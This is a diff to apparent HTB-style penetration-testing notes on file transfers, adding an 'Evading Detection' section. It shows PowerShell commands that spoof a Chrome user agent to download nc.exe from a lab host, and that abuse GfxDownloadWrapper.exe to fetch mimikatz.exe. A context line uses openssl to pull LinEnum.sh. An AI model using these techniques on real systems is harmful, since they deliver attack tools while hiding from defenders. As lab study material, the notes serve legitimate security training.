@@ -767,4 +767,22 @@ abdeonix@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 - Certutil
 
 
-## Detection
+## Evading Detection
+- Malicious file transfers can be detected by their user agents.
+- `Invoke-WebRequest` contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.
+```powershell
+# Listing out User Agents
+PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+# Request with Chrome User Agent
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+- [ ] Check LOLBAS / GTFOBins
+- An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically
+```powershell
+# Transferring File with GfxDownloadWrapper.exe
+PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+
+```
+- Other, more commonly available binaries are also available, and it is worth checking the LOLBAS project to find a suitable "file download" binary that exists in your environment
